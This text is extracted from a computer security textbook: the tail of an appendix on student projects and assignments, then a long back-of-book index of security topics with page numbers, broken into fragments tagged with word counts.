Capability-Based Access Control (Minix)
3
4
[Word Count: 6]

Address Space Randomization (Minix)
2
12
[Word Count: 6]

The programming project is a useful pedagogical tool. There are several ­attractive 
features of stand-alone programming projects that are not part of an existing ­security 
facility:
[Word Count: 26]

1.	 The instructor can choose from a wide variety of cryptography and computer
[Word Count: 13]

security concepts to assign projects.
	
2.	 The projects can be programmed by the students on any available computer and
[Word Count: 19]

in any appropriate language; they are platform- and language-independent.
	
3.	 The instructor need not download, install, and configure any particular
[Word Count: 20]

­infrastructure for stand-alone projects.
[Word Count: 4]

There is also flexibility in the size of projects. Larger projects give students more 
a sense of achievement, but students with less ability or fewer organizational skills can 
be left behind. Larger projects usually elicit more overall effort from the best students. 
Smaller projects can have a higher concepts-to-code ratio, and ­because more of them 
can be assigned, the opportunity exists to address a variety of different areas.
[Word Count: 68]

Again, as with research projects, the students should first submit a proposal. 
The student handout should include the same elements listed in the preceding ­section. 
The IRC includes a set of 12 possible programming projects.
[Word Count: 35]

The following individuals have supplied the research and programming 
projects suggested in the IRC: Henning Schulzrinne of Columbia University; Cetin 
Kaya Koc of Oregon State University; and David M. Balenson of Trusted Informa-
tion Systems and George Washington University.
[Word Count: 39]

The implementation of network firewalls can be a difficult concept for students to 
grasp initially. The IRC includes Network Firewall Visualization tool to convey and 
teach network security and firewall configuration. This tool is intended to teach and
[Word Count: 38]

770    Appendix A / Projects and Other Student Exercises
[Word Count: 9]

reinforce key concepts including the use and purpose of a perimeter firewall, the use 
of separated subnets, the purposes behind packet filtering, and the shortcomings of 
a simple packet filter firewall.
[Word Count: 31]

The IRC includes a .jar file that is fully portable, and a series of exercises. The 
tool and exercises were developed at U.S. Air Force Academy.
[Word Count: 26]

Teaching with case studies engages students in active learning. The IRC includes 
case studies in the following areas:
[Word Count: 18]

• Disaster recovery
 
• Firewalls
 
• Incidence response
 
• Physical security
 
• Risk
 
• Security policy
 
• Virtualization
[Word Count: 18]

Each case study includes learning objectives, case description, and a series 
of case discussion questions. Each case study is based on real-world situations and 
­includes papers or reports describing the case.
[Word Count: 31]

The case studies were developed at North Carolina A&T State University.
[Word Count: 11]

Another excellent way to reinforce concepts from the course and to give students 
research experience is to assign papers from the literature to be read and analyzed. 
The IRC includes a suggested list of papers to be assigned, organized by chapter. 
The Premium Content Web site provides a copy of each of the papers. The IRC also 
includes a suggested assignment wording.
[Word Count: 62]

Writing assignments can have a powerful multiplier effect in the learning proc-
ess in a technical discipline such as computer security. Adherents of the Writing 
Across the Curriculum (WAC) movement (http://wac.colostate.edu/) report sub-
stantial benefits of writing assignments in facilitating learning. Writing assign-
ments lead to more detailed and complete thinking about a particular topic. In 
addition, writing assignments help to overcome the tendency of students to pur-
sue a subject with a minimum of personal engagement, just learning facts and 
problem-solving techniques without obtaining a deep understanding of the sub-
ject matter.
[Word Count: 93]

A.11 / WEBCASTS FOR TEACHING COMPUTER SECURITY   771
[Word Count: 8]

The IRC contains a number of suggested writing assignments, organized by 
chapter. Instructors may ultimately find that this is the most important part of their 
approach to teaching the material. We would greatly appreciate any feedback on 
this area and any suggestions for additional writing assignments.
[Word Count: 46]

A.11	 WEBCASTS FOR TEACHING COMPUTER SECURITY
[Word Count: 6]

The Companion Website at williamstallings.com/ComputerSecurity (Instructor 
­Resources link) provides a link to a catalog of webcast sites that can be used to enhance 
the course. An effective way of using this catalog is to select, or allow the student to 
select, one or a few videos to watch, and then to write a report/analysis of the video.
[Word Count: 57]

ACM
Association for Computing Machinery
IEEE
Institute of Electrical and Electronics Engineers
NIST
National Institute of Standards and Technology
RFC
Request for Comments
[Word Count: 23]

Access attributes, 121
Access control, 26, 746. See also ­Role-​­based access control
[Word Count: 12]

284, 393, 400, 424, 428, 431, 442, 548, ­551–​­552, 565, 582, 
620, ­733–​­735, 740, 742, 746, 750, 752
Access rights, 117
[Word Count: 21]

hierarchy of subjects, 123
‘owner’ access right, 123
rules, ­121–​­123
­transfer-​­only right, 123
Access rules, 454
Access to ­e-​­mail contact list, 323
Accountability, 14, 26, 73, 187, 490, 499, 521, 557, 568, 635
Account hijacking, 188
Account logon events, ­590–​­591
Account management, 591
Accreditation, ­25–​­26, 526
ACM Code of Ethics and Professional Conduct, 630
Active attacks, 19, ­24–​­25, 732
Active directory (AD), 431, 591
Activity, 293
Address space, 211, 337, ­344–​­345, 347, ­363–​­365, 367, 370,
[Word Count: 75]

­372–​­373, 449, 581, 596, ­599–​­600, 766t
Address space randomization, ­364–​­365
Add Round Key stage, ­646–​­647
[Word Count: 15]

Add round key transformation, AES, ­650–​­651
Ad Hoc Committee on Responsible Computing, 632
Ad hoc networks, 733
Adleman, Len, 59, 679
Administrative management domain (ADMD), 699
Administrator, 172, 293
Advanced, 203
Advanced Encryption Standard (AES), 41, ­43–​­45, 432, 588,
[Word Count: 39]

638, ­643–​­645, 655, 660, 757
add round key transformation, ­650–​­651
AES Encryption Round, 647
encryption and decryption algorithms, 645
key expansion algorithm, 651
mix column transformation, 650
overall structure of, 646
overview, ­645–​­648
­S-​­boxes, 649
shift row transformation, ­648–​­650
SubBytes transformation, 648
substitutions and permutation, ­645–​­646
Advanced Persistent Threats (APT), 201, ­203–​­204
Adversary (threat agent), 17, 20, 28, ­30–​­31, 34, 37, 69, 75,
[Word Count: 63]

­79–​­80, 91, ­101–​­105, 109, 111, 685, 688
Adware, ­201–​­201t, 215, 330t, 614t
Agentless program, 605
Agent program, 605
AH information, 710
AITP Standard of Conduct, 631
Alarm processor, 580
Alert, 293
Alerting, 603
Alert Protocol, 701, ­703–​­706
Algorithms, 618
[Word Count: 39]

correct implementation of, ­392–​­394
correspondence between machine language and, 394
Alternative message formats, 592
Amplification attacks, ­257–​­259, 262
Amplifier attacks, 250
Analysis approaches, ­275–​­278
Analyzers, 272, 293
­AND-​­node, 32
AND security rule, 455
Anomaly detection, 168, ­275–​­277, 287, 324, 581, 603, 607
[Word Count: 42]

attacks suitable for, 288
detection phase, 276
­knowledge-​­based analysis, 276
­machine-​­learning analysis, ­276–​­277
SPA and, 288
statistical analysis, 276
training phase, 276
Anonymity, 624
Anonymization, 626
Anonymous, 269
Answer to reset (ATR) message, 92
Antireplay window, 710
Application and service configuration
[Word Count: 41]

in Linux/Unix security, 427
in Windows systems, ­431–​­432
[Word Count: 8]

­Application-​­based bandwidth attacks, ­252–​­254. See also
[Word Count: 6]

­Denial-​­of-​­service (DoS) attack
SIP flood, ­252–​­253
­Application-​­level audit trail, ­587–​­588
­Application-​­level gateway, ­312–​­313
Application owner, 171
Application programming interface (API), 183
Application security
[Word Count: 23]

application specific configuration, 424
encryption technology, ­424–​­425
Application virtualization, 433
Apprentice, 269
Architectural works, copyrighted, 616
Archives, 426, 580
Artifacts, 569, 632
Artificial Neural Networks (ANN), 279
Assessors, 146
Assets of a computer system, ­17–​­18, ­498–​­499
[Word Count: 36]

threats and, ­21–​­25
Association for Computing Machinery (ACM) Code of Ethics
[Word Count: 11]

and Professional Conduct, ­629–​­630
Association of Information Technology Professionals (AITP)
[Word Count: 10]

Standard of Conduct, 629, 631
Associative memory, 626
Assurance, 6, 36, 146, 380, 394, 456, 494, 548, 751
[Word Count: 18]

evaluation and, 36, ­476–​­481
IT security evaluation, ­476–​­481
level for user authentication, ­76–​­78, 144
requirements, 471, 473
scope of, ­477–​­478
security auditing and, 578
target audience, ­476–​­477
for verification of card, ­548–​­549
Asymmetric encryption, 41, 55
Asymmetric encryption algorithms, ­59–​­60. See also ­Public-​­key
[Word Count: 43]

encryption/cryptosystem
Atomic operation, software security, 406
Attack agent, ­222–​­224, 250
[Word Count: 10]

bots, ­223–​­224, 235, ­253–​­254, 318, 632
remote control facility, 224
zombies, ­201–​­202, ­220–​­222, ­250–​­251, 258, 262
Attack kit, ­201–​­201t, ­202–​­203
Attacks, 84. See also Countermeasures; ­Denial-​­of-​­service
[Word Count: 26]

(DoS) attack; Software security; SQL injection (SQLi) 
attack; Threats; Vulnerabilities
amplification, ­257–​­259, 262
amplifier, 250
­application-​­based bandwidth, ­252–​­254
application layer reconnaissance and, 287
banner grabbing, 288
blended, 202
­brute-​­force, ­43–​­45, 54, 85, 591, 645
­ciphertext-​­only, ­639–​­640
classic ­cross-​­site scripting (XSS), ­409–​­410
client, ­103–​­104
code injection, ­385–​­386, 401
command injection, 384, 410
­cross-​­site scripting (XXS), ­387–​­388
cryptanalytic, 80
defined, 17, 19
detecting, 19
distributed ­denial-​­of-​­service (DDoS), 8, 223, ­250–​­252
[Word Count: 68]

­458–​­459
­watering-​­hole, 217
on wireless networks, ­733–​­734
XSS, ­387–​­388
­zero-​­day, 275, ­280–​­281
Attack surfaces, ­31–​­32
Attack trees, ­32–​­34
Attended biometric (­BIO-​­A), 551
­Attribute-​­based access control (ABAC), 116, ­133–​­139
[Word Count: 28]

advantage of, 139
attributes in, 134
contrast with RBAC approach, ­138–​­139
flexibility of, 135
logical architecture, ­135–​­136
policies, ­135–​­136
policy model, ­137–​­138
Attribute certificates, 724
Attribute Exchange Network (AXN), 145
Attribute indexes, 179
Attribute providers (APs), 146
Attributes, 3, 29, 32, ­74–​­75, 97, 117, 121, 124, ­134–​­135, ­159–​­161,
[Word Count: 48]

174, 179, 190, 245, 428, 462, 464, 475, 589, 602, 724
Audit, 26, 115, 475. See also Security auditing
Audit analysis, 581
[Word Count: 22]

Audit analyzer, 580
Audit and alarms model (X.816), ­579–​­580
Audit archiver, 580
AUDIT_CALL_START, 596
Audit dispatcher, 580
Audit (log file) records, ­278–​­279
AUDIT_LOOKUP_COMMAND, 597
Auditors, 146
Audit provider, 580
Audit recorder, ­579–​­580
Audit records, ­host-​­based intrusion detection and, ­278–​­279
Audit review, 581, 602
Audit trail collector, 580
Audit trail examiner, 580
Audit trails, ­586–​­587, 601. See also Security auditing
[Word Count: 59]

analysis, ­600–​­604
review after an event, 601
Australian Signals Directorate (ASD), 418
Authenticated boot service, ­466–​­467
Authenticated session, 34
Authentication, 26, 115, 621, 746, 748
[Word Count: 25]

access control and, 115
biometric, ­96–​­100
electronic user, ­75–​­78
hash function and, ­47–​­55
message or data, ­47–​­52
­password-​­based, ­78–​­90
process, steps for, 73
­public-​­key encryption, 50, 52, 57
remote user, ­101–​­103
security issues for user, ­103–​­105
­token-​­based, ­90–​­96
using message encryption, ­48–​­52
using symmetric encryption, 48
Authentication Header (AH), 709
Authentication protocol, ­75–​­76, 95, 468, 734, 739, ­746–​­747
[Word Count: 58]

­challenge-​­response, 92
­Diffie-​­Hellman key exchange, ­685–​­686
dynamic biometric, 103
dynamic password generator, 92
Extensible Authentication Protocol (EAP), ­746–​­747, 751
IEEE 802.1X protocol, 751, 753
protocol type selection (PTS), 92
of a smart token, ­92–​­93, 102
static, 92
static biometric, 103
Authentication server (AS), ­717–​­718
Authenticators, 104
Authenticity, ­13–​­14, 22, 37, 48, 50, 226, 487, 490, 499, 548,
[Word Count: 57]

access control and, 115
cascading, ­170–​­171
Automatic response, 581
Automatic teller machine (ATM), 91
[Word Count: 14]

architectures, 108
cardholder, 107
issuer, 107
processor, ­107–​­108
security problems for, ­107–​­110
Autonomic enterprise security system, 290
­Auto-​­rooter, 201
[Word Count: 19]

Availability, 5, 7, ­12–​­16, 18, ­21–​­23, ­25–​­26, 35, ­37–​­38, 157,
[Word Count: 10]

­174–​­175, 177, 181, ­187–​­188, 191, 200, 223, ­241–​­242, 251, 
264, 269, ­413–​­414, 421, 458, 472, 487, 490, 499, ­508–​­509, 
511, 520, ­530–​­531, 568, 574, ­581–​­582, 591, 611
Awareness, 26
[Word Count: 29]

Backdoor (trapdoor), ­20–​­21, 201, ­214–​­215, ­226–​­227, 272, 330
Background checks and screening of employees, ­563–​­564
Backscatter traffic, DoS, 246, 257
Backup, data, 426
Banner grabbing attack, 288
Barrier security, 739
Baseline approach, ­493–​­494
Baselining, ­603–​­604
­Base-​­rate fallacy, ­274–​­275
[Word Count: 38]

IDS problem of, ­274–​­275
Basic principles, ­273–​­274
Basic service set (BSS), 740, ­742–​­743
Bastion host, 315
Bayesian networks, 277
­b-​­bit block of plaintext, 48
Bcrypt, 83
­Behavior-​­blocking software, 233
­Bell–​­LaPadula model for computer security, ­440–​­450
[Word Count: 35]

­4-​­tuple (b, M, f, H), ­442–​­444
abstract operations, ­444–​­445
example of use, ­445–​­450
formal description of model, ­442–​­444
general description, ­441–​­442
limitations, 448, 450
Multics, ­449–​­450
properties, 444
Bernstein, Daniel, 262
Biba integrity model of computer security, ­451–​­452
Billing/payments functions, 621
Biological viruses, 204
Biometric authentication system, 105, ­548–​­549, 551
[Word Count: 50]

accuracy of, ­98–​­100
cost vs. accuracy, 97
dynamic biometric protocol, 75, ­102–​­103
fingerprint patterns, 96
generic, 98
hand geometry systems, 96
iris system, 97, ­105–​­107
operating characteristic curve, 99–100
operation of, ­97–​­98
personal identification number (PIN), 98
physical characteristics of, ­96–​­97
retinal, 97
signature, 97
static biometric protocol, 75, ­102–​­103
using facial characteristics, 96
verification (identification) of, 98
voice pattern, 97
Biometric information, 95
BIOS code, 222
­Bit-​­by-​­bit ­exclusive-​­OR (XOR), 670
BitLocker, Windows security, 432
Bitwise ­exclusive-​­OR (XOR) operation, 47, 652
Blackhole crimeware toolkit, 203
Blended attack, 202
Blinding, 684
[Word Count: 90]

Blind SQL injection, 167
Blizzard, 538
Block cipher encryption, 46
[Word Count: 10]

blowfish symmetric, 83
Block cipher modes of operation, ­655–​­660
Block ciphers, 43, 47, 641, 643, 647, ­651–​­652, 675
Block encryption algorithms, 41, ­43–​­47, 638, 641
Block reordering, 48
Bloom filter, ­88–​­90
Blowfish symmetric block cipher, 83
Blue Pill rootkit, 229, 421
Boot Block, 466
Boot ROM, 466
Boot sector infector, 208
Botnet, 202, ­219–​­220, 223, 225, ­235–​­236, ­250–​­252, 257
Bots, ­222–​­224, 235, ­253–​­254, 318, 632
[Word Count: 65]

uses, 223
Bourne shell, 352, ­356–​­357
­Bring-​­your-​­own-​­device (BYOD) policy, ­737–​­738
Broad network access, 181
Browser helper objects (BHOs), 223
Brunner, John, 210
­Brute-​­force attack, ­43–​­45, 54, 85, 591, 645
­BSD-​­based systems, 429
BSD Syslog Protocol, 593
Buffer overflow, 338
[Word Count: 39]

attacks, ­337–​­338, 342, ­348–​­349, ­351–​­352, 360, ­362–​­365, 370
C code, 339
­compile-​­time defenses, ­359–​­363
countermeasures, ­359–​­365
definition, 338
example runs, 339
exploiting method, 341
exploits, 323
function call mechanisms, ­343–​­344
global data area overflows, ­370–​­371
heap, ­367–​­370
input size and, 381
­no-​­execute (NX), 364
replacement stack frame, ­365–​­366
return to system call, ­366–​­367
­run-​­time defenses, ­363–​­365
shellcode, ­352–​­359
stack, ­342–​­351
stack values, 340
Buffer overrun. See Buffer overflow
BUFSIZ constant, 349
Bushfire, 541
Business continuity and disaster recovery, 193
­Business-​­use-​­only policy, 566
[Word Count: 82]

Calculated code, 49
Calling function, ­343–​­344
Canary value, 363
Canonicalization, 390, 411
Capability, 500
Capability tickets, ­118–​­119, 724
Card access number (CAN), 93, 96
Card authentication key (CAK), 551
Cardholder unique identifier (CHUID), 548, 551
Cardinality, RBAC roles, ­132–​­133
Cascaded access right, 171
[Word Count: 43]

Cascading authorizations, ­170–​­171
­CD-​­ROM, 588
Centralized administration, 169
CERT. See Computer Emergency Response Team (CERT)
CERT 2007 ­E-​­crime Survey, 612, 614
Certificate authority (CA), 61, 317, 425, 550, 722, 726
Certificate revocation list (CRL), 724
Certificates
[Word Count: 36]

attribute, 724
conventional (­long-​­lived), 723
proxy, 724
­public-​­key, ­61–​­62
­short-​­lived, 724
X.509, 62
Certification, 26
[Word Count: 15]

cross, 727
rules, 452
service, 467
Certifier, 480
­Challenge-​­response protocol, ­101–​­102, ­104–​­105, 110
Change Cipher Spec Protocol, 701, 703
Change management, ­527–​­528
Channel, ­33–​­34, 472, ­478–​­479, 590, 619, 652, 732, ­750–​­751
­Charge-​­coupled device (CCD), 65
Chernobyl virus, 221
Chinese wall model, ­454–​­456
Choreographic works, copyrighted, 616
Chroot jail, 402, 416, ­429–​­430
Chroot system, 429
chroot system function, 402
CHUID digital signature, ­549–​­550
CIA triad, 13
Cipher block chaining (CBC) mode, ­656–​­657, 671
Cipher block feedback (CFB) mode, ­657–​­659
Cipher suite, 750
Ciphertext, 42, 56, 638, 640
[Word Count: 86]

­public-​­key encryption, 56
symmetric encryption, 42
­Ciphertext-​­only attack, ­639–​­640
­Circuit-​­level gateway/­circuit-​­level proxy, ­313–​­314
CIRT. See Computer incident response team (CIRT)
Claimant, 75
­Clark–​­Wilson model (CWM) of computer security, ­452–​­453
Class, 117, ­126–​­127, 134, 269, 364, 368, 382, 387, 441, 454, 459,
[Word Count: 41]

­471–​­473, 519, ­624–​­625
Classic ­cross-​­site scripting (XSS) attack, ­409–​­410
Classification creep, 448
Clearinghouse, 620
Clear signed data, S/MIME, 696
Clickjacking, 218
Client, 178
Client attacks, ­103–​­104
Cloud auditor, ­185–​­187
Cloud broker, ­185–​­186
Cloud carrier, ­185–​­186
Cloud computing, ­180–​­187
[Word Count: 38]

abuse and nefarious use of, 187
basic APIs, security of, 187
broad network access, 181
cloud security as a service, ­189–​­193
community cloud, 184
computing context, 184
[Word Count: 27]

27002), 583, ­623–​­624
Code Red II, ­214–​­215
Codes of conduct, ­629–​­632
Code, writing safe programs using, ­392–​­396
Collision resistance, 49n3, ­53–​­54
Collision resistant hash functions, 53
Combined approach, security risk assessment, 495
­Command-​­and-​­control (C&C) server network, 224
Command injection attack, 384, 410
Commercial Product Evaluation Program, 458
Common controls, 520
Common Criteria (CC), ­470–​­476, 478, ­480–​­481, 580, 582, 602,
[Word Count: 59]

­624–​­625
assurance level, 394, ­478–​­479
for information technology security evaluation, ­470–​­476
security assurance requirements, 473
security functional requirements, 472
Common Criteria Evaluation and Validation Scheme
[Word Count: 25]

(CCEVES), 480
Communication lines, computer security and, 22
Communications channel (CC), 33
Communications facilities and networks, 18
Community cloud, 184
CommWarrior worm, 217
Companion key, 56
Companion Web site, 8
Company policy, 567
Company rights, 567
­Compile-​­time defenses, ­359–​­363
Complete mediation, 28, 458
Complex password policy, 88
Component, 471
Compression, 702
Compression function, 678
Compromise, 79, 412, 511
Computationally secure, 640
Computer crime. See Cybercrime
[Word Count: 65]

Computer Emergency Response Team (CERT), 32, 337, 572
­Computer-​­generated passwords, 88
Computer incident response team (CIRT), 569
Computers
[Word Count: 18]

as communications tools, 612
as storage devices, 612
as targets, 611
Computer security
[Word Count: 13]

availability, ­15–​­16
breach of levels, 14
categories of vulnerabilities, 18
challenges of, ­16–​­17
confidentiality, 15
consumers of services and mechanisms, 36
cost of security failure, 35
criteria for evaluation of, ­470–​­476
definition, ­12–​­16
ease of use vs. security, 35
functional requirements, ­25–​­27
fundamental security design principles, ­27–​­31
high level, 14
implementation of, ­35–​­36
integrity, 15
key objectives, 13
low level, 14
model for, ­17–​­19
moderate level, 14
policy, ­34–​­35
privacy and, 13, 15, 23, ­143–​­144, 146, ­187–​­188, 566, 611, 619,
[Word Count: 80]

­621–​­626
scope of, 22
strategy, ­34–​­36
system resources (assets), 18, ­21–​­23
terminology, 17
threats to, ­19–​­25
Computer security incident response team (CSIRT), ­567–​­574
[Word Count: 23]

detecting incidents, ­569–​­570
documenting incidents, 573
information flow for incident handling, ­573–​­574
responding to incidents, ­571–​­572
tools for, 570
triage function, ­570–​­571
Computer security models
[Word Count: 25]

­Bell–​­LaPadula model, ­440–​­450
Biba integrity, ­451–​­452
Chinese Wall Model (CWM), ­454–​­456
­Clark-​­Wilson model (CWM), ­452–​­453
multilevel security, 442, ­459–​­466
Computing artifact, 632
Conficker (or Downadup) worm, 215
Confidence, 548
Confidentiality, 15, 23, 109, 702, 758
[Word Count: 35]

computer security and, 13, 15, 23
data, 13
Family Education Rights and Privacy Act (FERPA), 15
message or data authentication without, ­48–​­49
­public-​­key encryption, ­56–​­57
secure system, 444
symmetric encryption and, ­41–​­47
threat to, 19
Configuration management, 22, ­25–​­26, 28, 306, 473, 478, 515,
[Word Count: 44]

Connection, 701
Consequence, ­19–​­21, 23, 55, 242, 245, 249, 257, 262, ­264–​­265,
[Word Count: 12]

­337–​­338, 351, 354, 373, 377, 379, 382, 385, ­389–​­390, 392, 
­395–​­396, ­400–​­402, 410, 424, 426, ­433–​­434, 486, 490, 494, 
­499–​­501, ­503–​­505, 507, ­509–​­514, 523, 528, ­537–​­538, 561, 
563, 567, ­630–​­631, ­647–​­648
Constant exponentiation time, 684
Constituency, 569
Constrained data items (CDIs), 452
Consumers, 476, 619, 620
Content management, 621
Content ownership, 566
Content provider, 619
­Content-​­Type HTTP response header, 411
Contingency planning, 26
Continuum of learning programs, ­558–​­559
Contractual obligations, 558
Control, 13, 27, 48, 75, 84, 94, 106, 158, 166, ­182–​­184, 187, 189,
[Word Count: 84]

192, ­206–​­207, 222, 224, ­232–​­233, 242, ­250–​­251, 273, 
320, 337, ­341–​­343, ­346–​­347, 352, 356, 358, ­363–​­368, 370, 
­388–​­389, 393, 396, 398, 402, 404, 406, ­410–​­411, 418, 423, 
­425–​­426, 441, 492, ­497–​­498, ­507–​­508, 510, ­516–​­524, 536, 
544, 611, 661, 697, 733, ­736–​­737, ­741–​­742, 756. See also 
Access control
Conventional (­long-​­lived) certificates, 723
Cookies, 166
Cooperating conspirator problem, 450
Copying of biometric parameter, 105
Copyright law, 616
Copyrights, intellectual property and, 615
Corporate policies, 623
Corporate security, 316, 490
Correlation, 604
Corrupted system, 18
Corruption, ­20–​­21, 38, 189, 200, 202, ­221–​­222, 338, ­340–​­341,
[Word Count: 91]

360, 372, 395, 401, 426, 509, 514
Cost of security failure, 35
Countermeasures, 18, 19, ­516–​­524
[Word Count: 16]

attack strategies and, ­79–​­80
buffer overflow, ­359–​­365
for cloud computing risks, ­187–​­188
­compile-​­time defenses, ­359–​­363
­denial-​­of-​­service (DoS) attack, ­259–​­263
distributed intelligence gathering, 235
flooding attacks, 261
generic decryption, ­232–​­233
heap overflows, 368
­host-​­based ­behavior-​­blocking software, 233
­host-​­based scanners, ­231–​­234
for malware, ­229–​­235
perimeter scanning, ­234–​­235
rootkit, 234
­run-​­time defenses, ­363–​­365
safe coding techniques, ­360–​­362
safe libraries, 362
spyware detection and removal, 234
of SQLi attacks, 168
stack protection mechanisms, ­362–​­363
Trojan horse defense, ­458–​­459
Counter (CTR) mode, ­659–​­660
Counter ­Mode-​­CBC MAC Protocol (CCMP), 750, ­758–​­759
Covert channel analysis, 478, 479
C programming language, 342
[Word Count: 94]

CPU emulator, 232
Credential management, ­141–​­142
Credentials, 74
Credential service provider (CSP), 74
Credential theft, ­224–​­225
Crimeware, 202, 225
CRL issuer, 727
Cross certification, 727
­Cross-​­site scripting attacks (XXS), ­387–​­388
Cryptanalysis, ­42–​­43, 45, ­54–​­55, ­639–​­641
Cryptanalytic attacks, 80
Cryptographic ­co-​­processor, 468
Cryptographic message authentication code, 118
Cryptographic tools
[Word Count: 48]

asymmetric encryption algorithms, ­59–​­60
confidentiality, ­41–​­47
digital envelopes, ­63–​­64
digital signatures, ­60–​­63
encryption of stored data, ­66–​­67
hash functions, ­50–​­55
key management, ­48–​­50
message authentication, ­48–​­50
Pretty Good Privacy (PGP), ­66–​­67
pseudorandom numbers, ­64–​­66
­public-​­key encryption, ­55–​­63
random number, ­65–​­66
symmetric encryption, ­41–​­43
Cryptography. See ­Public-​­key encryption/cryptosystem; Sym-
[Word Count: 48]

metric encryption
CS2013, ­6–​­8
CSI/FBI Computer Crime and Security Survey, 500
CWE/SANS Top 25 Most Dangerous Software Errors list, 377
Cybercrime, ­611–​­612
[Word Count: 22]

cited in the convention on cybercrime, 613
law enforcement challenges, ­612–​­614
types, ­611–​­612
Cybercrime victims, 614
Cyber criminals, ­268–​­269, 613
­Cyber-​­espionage worm, 216
Cyberslam, DoS, 243
[Word Count: 26]

3DES. See Triple DES
DAC. See Discretionary access control (DAC)
Data, 18, 23
[Word Count: 13]

backup, 426
­clear-​­signed, 696
confidentiality, 13, 38, 611, 755, 758
correct interpretation of, ­394–​­395
defined, 13n1
destruction, ­221–​­222
enveloped, 694, 697
generation, ­580–​­581
integrity, 13, 21, 23, 36, 38, 47, 54, ­57–​­58, 61, 109, 281, 465,
[Word Count: 36]

536, 611, 634, ­670–​­671
leakage or loss, 188
owner, 177
personal, 93
sanitized, 456
signed, 694
signed and ­clear-​­signed, ­696–​­697
signed and enveloped, 696
source, 293
surveillance and privacy, ­625–​­626
[Word Count: 30]

swapping, ­653–​­654
transformation, 626
values, writing correct code for, ­394–​­396
Data definition language (DDL), 158, 173
Data Encryption Algorithm (DEA), 43, 643
Data Encryption Standard (DES), 41, 643, 717
[Word Count: 29]

algorithm, 82
Data exfiltration, 226
Data loss prevention (DLP), 190
Data manipulation language (DML), 158
Data protection in cloud computing, 189
[Word Count: 21]

­multi-​­instance model, 189
­multi-​­tenant model, 189
Database access control, ­169–​­173
[Word Count: 10]

cascading authorizations, ­170–​­171
fixed database roles, 172
fixed server roles, 172
range of administrative policies, 169
­role-​­based, ­171–​­173
­SQL-​­based, ­169–​­170
­user-​­defined roles, ­172–​­173
Database encryption, ­176–​­180
[Word Count: 26]

disadvantages to, 176
entities, ­177–​­178
example, 180
Database management system (DBMS), ­157–​­159, 177, ­464–​­465
[Word Count: 14]

architecture, 158
Database RBAC facility, 172
Databases, 157, 618. See also Database access control
[Word Count: 14]

encryption, ­176–​­180
inference and, ­173–​­176
multilevel security (MLS) of, ­461–​­466
query language, ­157–​­158
relational, ­159–​­163
security kernel, ­457–​­458
security, need for, ­156–​­157
statistical, 618
storage for logs, 592
­Day-​­to-​­day interfaces, 29
Deadlock, prevention of, 396
Deallocator, 370
Decentralized administration, 169
Deception, 21
Decryption, 44, ­46–​­47, 50, 56, 59
Decryption algorithm, 42, ­56–​­57, 638, 645, 647, 657, 660, 681,
[Word Count: 58]

684, 729
­public-​­key encryption, 56
symmetric encryption, 42
Defense in depth, 30
Defensive coding, 168
Defensive programming, 7, ­376–​­380. See also Programming
[Word Count: 22]

projects
Deletion, access to, 117
­Denial-​­of-​­service (DoS), 24, 734
­Denial-​­of-​­service (DoS) attack, 31, 105, 164, 288
[Word Count: 16]

amplification, 251, 255, ­257–​­259
classic, 244
countermeasures, 252, ­259–​­263
distributed, 8, 223, ­250–​­252
flooding, ­248–​­250
nature, ­241–​­244
reflection, ­255–​­257
responding to, ­263–​­264
[Word Count: 22]

smurf DoS program, 258
source address spoofing, ­244–​­246
SQLi attack and, 164
SYN spoofing attack, ­246–​­248
Tribe Flood Network (TFN), 251
Design patents, 617
Design specification and verification, 478
Destination IP address, 309
Destructor functions, 370
Detailed security risk analysis, ­494–​­495
[Word Count: 41]

analysis of risks, ­501–​­505
context or system characterization, ­497–​­499
evaluation of risks, 505
identification of threats/risks/vulnerabilities, ­499–​­501
risk treatment, ­506–​­507
Silver Star Mines, risk assessment process, ­507–​­512,
[Word Count: 27]

­528–​­531
Detecting an attack, 19
Detection, ­35–​­36
[Word Count: 7]

and recovery control, 518
Detection methods, 168
Deterrence, 500
Developers, 476, 480, 562
­Diffie–​­Hellman key exchange/key agreement, 59, 63,
[Word Count: 19]

­684–​­688
Digital content, 618
Digital envelopes, ­63–​­64
Digital identity, 141
Digital immune system, ­324–​­326
Digital Millennium Copyright Act (DMCA), ­618–​­619
Digital Rights Management (DRM), ­619–​­621
[Word Count: 25]

architecture, 621
billing/payments functions, 621
components, 620
Digital Signature Algorithm (DSA), 59
Digital signatures, ­60–​­64
Digital Signature Standard (DSS), 59, 688, 696
Directed broadcast, 258, ­262–​­264
Directory information, 15
Directory service access, 591
Directory traversal, 323
Disciplinary action, 567
Disclosure, 7, 13, ­19–​­21, 23, 30, ­38–​­39, 76, 174, 188, 451, 510,
[Word Count: 51]

521, 564, 567, 631, 635
Discretionary access control (DAC), 116, ­118–​­124
[Word Count: 11]

access matrix controller, 121
access rights of subjects, 121
of devices, 120
general model for, ­120–​­123
logical or functional point of view, 121
of memory locations or regions, 120
of processes, 120
protection domains, ­123–​­124
rules for transferring, granting, and deleting access rights,
[Word Count: 43]

­121–​­123
display() function, 349
Dispute resolvers, 146
Disruption, ­20–​­21, ­24–​­25, 31, 38, 191, 203, 211, 241, 538, 568,
[Word Count: 18]

614, 734, 745
Distributed ­denial-​­of-​­service (DDoS) attacks, 8, 223, ­250–​­252
Distributed detection and inference (DDI) events, ­290–​­291
Distributed firewalls, 320, 322
Distributed ­host-​­based intrusion detection, 268
[Word Count: 26]

Distributed intrusion prevention system (IPS), 235, ­281–​­283
[Word Count: 7]

architecture for, 282
central manager module, 282
host agent module, 282
LAN monitor agent module, 282
major issues in the design of, ­281–​­282
Distributed or hybrid IDS, 273, ­289–​­291
Distribution right, 616
Distribution system (DS), 546, 740, ­742–​­744, 747
Distributor, 619
DMZ (demilitarized zone), 295
[Word Count: 45]

networks, ­317–​­319
DNS amplification attacks, ­258–​­259
Document number, 93
DomainKeys Identified Mail (DKIM), ­697–​­700
Domain name system (DNS), 287, 699
Dormant phase of virus, 205
DoS. See ­Denial-​­of-​­service (DoS)
Double bastion inline, 322
Double bastion T, 322
Downloaders, 201
Dramatic works, copyrighted, 616
­Drive-​­by-​­download attack, 201, 203, ­217–​­218
Drone, 222
Drop, 326
­Ds-​­property, 442, 444
Duqu worm, 216
Dust, 542
Dynamically linked shared libraries, ­596–​­597
Dynamic binary rewriting, ­598–​­600
Dynamic biometric authentication, ­96–​­101
Dynamic biometric protocol, 103
Dynamic Host Configuration Protocol (DHCP), 287
Dynamic Link Libraries (DLLs), 279
[Word Count: 88]

EAP exchange, ­752–​­753
EAPOL Key Encryption Key (­EAPOL-​­KEK), 756
EAP Over LAN (EAPOL) Key Confirmation Key (­EAPOL-​
